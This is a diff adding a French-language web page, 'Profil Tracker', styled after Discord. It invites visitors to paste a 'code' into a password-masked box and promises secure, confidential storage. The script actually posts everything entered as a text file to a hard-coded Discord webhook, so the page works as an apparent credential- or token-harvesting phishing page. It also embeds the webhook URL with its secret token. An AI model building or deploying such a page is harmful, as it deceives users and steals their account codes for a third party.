@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profil Tracker</title>
+    <style>
+        :root {
+            --primary-color: #7289DA;
+            --secondary-color: #5865F2;
+            --accent-color: #EB459E;
+            --text-color: #FFFFFF;
+            --background-color: #18191C;
+            --card-color: #23252C;
+            --input-bg: #2C2F33;
+            --success-color: #43B581;
+            --error-color: #F04747;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: 
+                radial-gradient(circle at 20% 35%, rgba(114, 137, 218, 0.15) 0%, transparent 30%),
+                radial-gradient(circle at 75% 65%, rgba(235, 69, 158, 0.1) 0%, transparent 30%);
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            text-align: center;
+            padding: 50px 30px;
+            background-color: var(--card-color);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.35);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .logo {
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: pulse 2s infinite alternate;
+        }
+        
+        .logo svg {
+            width: 80px;
+            height: 80px;
+            fill: var(--primary-color);
+        }
+        
+        h1 {
+            font-size: 3.8rem;
+            margin-bottom: 25px;
+            color: var(--text-color);
+            letter-spacing: 2px;
+            font-weight: 800;
+            transition: all 0.5s ease;
+            cursor: default;
+            position: relative;
+            display: inline-block;
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0px 3px 10px rgba(114, 137, 218, 0.3);
+        }
+        
+        h1:hover {
+            transform: scale(1.05);
+            letter-spacing: 3px;
+        }
+        
+        h1::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 4px;
+            bottom: 0;
+            left: 50%;
+            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+            transition: all 0.5s ease;
+            border-radius: 10px;
+        }
+        
+        h1:hover::after {
+            width: 100%;
+            left: 0;
+        }
+        
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 40px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.7);
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .input-container {
+            margin-bottom: 35px;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        .input-container:hover {
+            transform: translateY(-5px);
+        }
+        
+        .input-container:focus-within {
+            transform: translateY(-5px);
+        }
+        
+        textarea {
+            width: 100%;
+            height: 180px;
+            padding: 18px 20px;
+            border-radius: 12px;
+            border: 2px solid rgba(114, 137, 218, 0.3);
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            font-size: 1.1rem;
+            resize: vertical;
+            transition: all 0.3s ease;
+            -webkit-text-security: disc;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
+        }
+        
+        textarea:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 5px 20px rgba(114, 137, 218, 0.25);
+        }
+        
+        .btn-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 1px;
+            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.4);
+            z-index: 1;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, var(--secondary-color), var(--accent-color));
+            z-index: -1;
+            transition: opacity 0.5s ease;
+            opacity: 0;
+        }
+        
+        .btn:hover::before {
+            opacity: 1;
+        }
+        
+        .btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(88, 101, 242, 0.5);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .notification {
+            padding: 15px 25px;
+            border-radius: 10px;
+            margin-top: 25px;
+            font-weight: 500;
+            transform: scale(0.95);
+            opacity: 0;
+            transition: all 0.4s ease;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .success {
+            background-color: rgba(67, 181, 129, 0.15);
+            border-left: 4px solid var(--success-color);
+            color: var(--success-color);
+        }
+        
+        .error {
+            background-color: rgba(240, 71, 71, 0.15);
+            border-left: 4px solid var(--error-color);
+            color: var(--error-color);
+        }
+        
+        .show-notification {
+            transform: scale(1);
+            opacity: 1;
+        }
+        
+        .loading {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        .loading-spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease infinite;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.1); }
+        }
+        
+        .footer {
+            margin-top: 40px;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2.8rem;
+            }
+            
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+            </svg>
+        </div>
+        <h1>Profil Tracker</h1>
+        <p>Suivez et enregistrez vos informations personnelles de manière sécurisée et instantanée. Entrez votre code et cliquez sur Send pour l'envoyer.</p>
+        
+        <div class="input-container">
+            <textarea id="profileData" placeholder="Entrez votre code ici..."></textarea>
+        </div>
+        
+        <div class="btn-container">
+            <button id="sendButton" class="btn">Send</button>
+            <div class="loading">
+                <div class="loading-spinner"></div>
+            </div>
+        </div>
+        
+        <div id="notification" class="notification">
+            Message de statut apparaîtra ici
+        </div>
+        
+        <div class="footer">
+            Profil Tracker © 2025 - Sécurité et confidentialité garanties
+        </div>
+    </div>
+
+    <script>
+        const sendButton = document.getElementById('sendButton');
+        const profileData = document.getElementById('profileData');
+        const notification = document.getElementById('notification');
+        const loading = document.querySelector('.loading');
+        
+        // Animation du titre
+        const title = document.querySelector('h1');
+        title.addEventListener('mouseover', () => {
+            title.style.textShadow = '0 0 15px rgba(114, 137, 218, 0.6)';
+        });
+        
+        title.addEventListener('mouseout', () => {
+            title.style.textShadow = '0px 3px 10px rgba(114, 137, 218, 0.3)';
+        });
+        
+        // Fonction pour afficher les notifications
+        function showNotification(message, type) {
+            notification.textContent = message;
+            notification.className = 'notification ' + type;
+            notification.classList.add('show-notification');
+            
+            setTimeout(() => {
+                notification.classList.remove('show-notification');
+            }, 4000);
+        }
+        
+        // Fonction pour envoyer les données au webhook Discord
+        async function sendToDiscord(text) {
+            const webhookUrl = "https://discord.com/api/webhooks/1347478181778690090/uVa9OeMo5qxPUcygQ6JYWTa4jsrEC4oPA_YcFoVVlKM-NrB1-abMBCmvXM8hX0e2nsb4";
+            
+            // Création d'un fichier texte
+            const file = new File([text], "profil_data.txt", {
+                type: "text/plain",
+            });
+            
+            // Création du FormData pour l'envoi de fichier
+            const formData = new FormData();
+            formData.append("file", file);
+            formData.append("content", "Nouveau profil soumis:");
+            
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    return true;
+                } else {
+                    console.error("Erreur lors de l'envoi:", await response.text());
+                    return false;
+                }
+            } catch (error) {
+                console.error("Erreur:", error);
+                return false;
+            }
+        }
+        
+        // Gestionnaire d'événement pour le bouton d'envoi
+        sendButton.addEventListener('click', async () => {
+            const text = profileData.value;
+            
+            if (text.trim() === '') {
+                showNotification('Veuillez entrer du texte avant d\'envoyer.', 'error');
+                return;
+            }
+            
+            // Afficher l'animation de chargement
+            sendButton.style.opacity = '0.5';
+            loading.style.display = 'block';
+            
+            // Envoyer les données
+            const success = await sendToDiscord(text);
+            
+            // Masquer l'animation de chargement
+            sendButton.style.opacity = '1';
+            loading.style.display = 'none';
+            
+            if (success) {
+                showNotification('Votre code a été envoyé avec succès!', 'success');
+                profileData.value = '';
+            } else {
+                showNotification('Erreur lors de l\'envoi. Veuillez réessayer.', 'error');
+            }
+        });
+        
+        // Effet visuel lors du clic sur le bouton
+        sendButton.addEventListener('mousedown', function(e) {
+            const rect = this.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            
+            const ripple = document.createElement('span');
+            ripple.style.position = 'absolute';
+            ripple.style.width = '1px';
+            ripple.style.height = '1px';
+            ripple.style.background = 'rgba(255, 255, 255, 0.7)';
+            ripple.style.borderRadius = '50%';
+            ripple.style.transform = 'translate(-50%, -50%)';
+            ripple.style.left = x + 'px';
+            ripple.style.top = y + 'px';
+            ripple.style.animation = 'ripple 0.6s linear';
+            
+            this.appendChild(ripple);
+            
+            setTimeout(() => {
+                ripple.remove();
+            }, 600);
+        });
+        
+        // Animation pour l'effet de vague
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes ripple {
+                0% {
+                    width: 0;
+                    height: 0;
+                    opacity: 0.6;
+                }
+                100% {
+                    width: 300px;
+                    height: 300px;
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Initialiser la notification comme masquée
+        notification.classList.remove('show-notification');
+    </script>
+</body>
+</html>
